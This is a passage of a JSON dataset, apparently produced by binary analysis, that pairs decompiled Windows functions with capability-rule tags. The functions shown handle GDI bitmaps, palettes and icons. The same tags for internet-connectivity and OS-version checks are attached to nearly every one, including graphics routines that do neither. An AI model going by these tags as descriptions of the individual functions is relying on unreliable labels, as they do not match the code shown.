        "decompiled_code": "\nvoid __cdecl\nfcn.004275e8(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x48484c == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x427630;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x427635;\n        uStack68 = fcn.00427444();\n        iStack72 = arg_10h;\n        puStack76 = 0x427645;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x4276bb;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar2 = fcn.004075ec();\n        uVar3 = uVar1;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar3 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x42786f, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar3, arg_ch, arg_8h, \n                           uVar2);\n        sub.gdi32.dll_DeleteObject(uVar3);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x4276ce;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x4276d3;\n    uVar3 = fcn.00427444();\n    uStack64 = 0x427868;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x4276ef;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x4276f4;\n    uVar1 = fcn.00427444();\n    uStack84 = uVar1;\n    iVar4 = sub.gdi32.dll_SelectObject(uVar3);\n    iVar5 = sub.gdi32.dll_SelectPalette(hdc, *0x485890, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar5, 0);\n    if (iVar5 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar3, *0x485890, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar3, iVar5, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar3);\n    sub.gdi32.dll_StretchBlt(uVar3, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar3, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar4 != 0) {\n        sub.gdi32.dll_SelectObject(uVar3, iVar4);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar3, hpal, 0, 0x42786f);\n    }\n    sub.gdi32.dll_DeleteDC(uVar3);\n    return;\n}\n",
        "token_count": 1132
    },
    "00427aa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00427aa8(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x485890 != 0) {\n        uStack20 = 0;\n        puStack24 = 0x427ac5;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x427b2e;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.00427aa8::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x485890, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x485890;\n            sub.gdi32.dll_GetPaletteEntries(*0x485890, 8, 8, (in_EAX - 0x1c) + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar3 = sub.user32.dll_ReleaseDC(0, uVar1, 0x427b35);\n        return uVar3;\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 435
    },
    "00427b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00427b40(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x427ba2;\n        fcn.00402d34();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x427b5e;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x427b67;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x427b7b;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x427b87;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.00427aa8(),  cVar1 == '\\0')) {\n            fcn.00427938();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 527
    },
    "00427be4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00427be4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.00427938();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 119
    },
    "00427c38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427c38(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x427c65;\n    iVar1 = fcn.004275d4();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x427c7d;\n    iVar1 = fcn.004275b4();\n    uStack40 = 0;\n    puStack44 = 0x427c86;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x427c94;\n        fcn.00427348();\n    }\n    uStack48 = 0x427dea;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x427ccb;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x427cd0;\n    uVar2 = fcn.00427444();\n    uStack84 = 0x427d07;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.00427454();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x427d0e;\n    uStack88 = 0x427d06;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 571
    },
    "00427e98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427e98(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint uStack148;\n    int32_t iStack144;\n    uint uStack140;\n    uchar *puStack136;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x427ebe;\n    fcn.0040881c();\n    uStack140 = 0x42819a;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    uStack148 = 0x427edd;\n    puStack136 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack148 = 0xb;\n        puStack152 = 0x427eeb;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack152 = 0xc;\n        uStack156 = 0x427ef7;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack148 = 0;\n    puStack152 = 0x427f13;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack152 = 0x427f21;\n        fcn.00427348();\n    }\n    uStack156 = 0x427f81;\n    iStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff60;\n    puStack152 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x427f88);\n    return;\n}\n",
        "token_count": 572
    },
    "004281d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004281d4(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.00427324();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.004031a8();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.004275d4();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "00428324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00428324(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x42833f;\n    fcn.004281d4();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x42834b;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x4283c1;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00428324::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.00428324::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x4283c8, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 442
    },
    "004283f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004283f8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack100 = 0x428416;\n    fcn.004031a8();\n    puStack100 = 0x428425;\n    fcn.004031a8();\n    puStack100 = &fcn.004283f8::piconinfo;\n    puStack108 = 0x42842f;\n    uStack104 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack108 = 0x428434;\n    fcn.004283ec();\n    uStack112 = 0x4285e4;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &fcn.004283f8::var_1h + 1;\n    fcn.004282b8(2);\n    puStack128 = 0x428462;\n    fcn.004282b8(0x10);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack132 = 0x4285bd;\n    uStack136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff78;\n    puStack128 = &fcn.004283f8::var_1h + 1;\n    var_18h = fcn.0040881c();\n    var_1ch = fcn.0040881c();\n    var_20h = fcn.0040881c();\n    var_24h = fcn.0040881c();\n    fcn.00428324(2, var_1ch);\n    uVar1 = 0x10;\n    fcn.00428324(0x10, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *(var_20h + 8) = *(var_20h + 8) + *(var_20h + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar1;\n    fcn.00402b44(0x4285c4);\n    fcn.00402b44();\n    fcn.00402b44();\n    fcn.00402b44();\n    return;\n}\n",
        "token_count": 868
    },
    "0042862c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042862c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00428644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00428644(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004039b8();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "004286e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004286e8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    ulong uVar8;\n    ulong uVar9;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x0042870d:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x428700;\n        iVar2 = fcn.00403764();\n        puStack32 = 0x428709;\n        iVar3 = fcn.00403764();\n        if (iVar2 != iVar3) goto code_r0x0042870d;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x42871d;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x428728;\n        uVar4 = (**(*param_2 + 0x1c))();\n        if (uVar4 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x428766;\n                puVar6 = fcn.004037f0();\n                uStack36 = 0x42881f;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x428781;\n                puStack32 = &fcn.004286e8::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x42878d;\n                puVar7 = fcn.004037f0();\n                uStack48 = 0x428802;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.004286e8::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar8 = (***puVar6)();\n                uVar9 = (***puVar7)();\n                if (uVar9 >> 0x20 == uVar8 >> 0x20 && uVar9 == uVar8) {\n                    (***puVar6)();\n                    cVar1 = fcn.00408980();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x004287e9;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x004287e9:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x428809;\n                uStack48 = 0x428801;\n                uVar4 = fcn.00403820();\n                return uVar4;\n            }\n            goto code_r0x00428826;\n        }\n    }\n    puStack32 = 0x428733;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\ncode_r0x00428742:\n        uVar4 = 0;\n    }\n    else {\n        puStack32 = 0x42873e;\n        uVar5 = (**(*param_2 + 0x1c))();\n        if (uVar5 == '\\0') goto code_r0x00428742;\n        uVar4 = CONCAT31(uVar5 >> 8, 1);\n    }\n    var_1h._0_1_ = uVar4;\ncode_r0x00428826:\n    return uVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 962
    },
    "0042888c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042888c(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, unaff_EBX & 0xffffff00 | arg_10h & 0xff, \n                            unaff_EBX & 0xffffff00 | arg_14h & 0xff);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00428be8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428be8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x428c66;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.0041c4c8();\n            fcn.00403770();\n            fcn.0040482c();\n            fcn.004049d4();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x428c6d;\n    uStack288 = 0x428c65;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 291
    },
    "00428dec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00428dec(void)\n\n{\n    if (*0x4838b8 == 0) {\n        *0x4838b8 = fcn.004289d4();\n    }\n    return *0x4838b8;\n}\n",
        "token_count": 57
    },
    "00428e0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00428e0c(void)\n\n{\n    if (*0x4838b4 == 0) {\n        *0x4838b4 = fcn.00428cd8();\n    }\n    return *0x4838b4;\n}\n",
        "token_count": 59
    },
    "00429100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429100(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, unaff_EBX & 0xffffff00 | arg_10h & 0xff, \n                            unaff_EBX & 0xffffff00 | arg_14h & 0xff);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00429128": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429128(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x42922f;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x429157;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x429166;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x429171;\n    fcn.0040482c();\n    piStack104 = 0x42917e;\n    iVar1 = fcn.00428be8();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x42918c;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x4291b1;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x4291d0;\n    fcn.00403820();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x4291ee;\n        iVar1 = 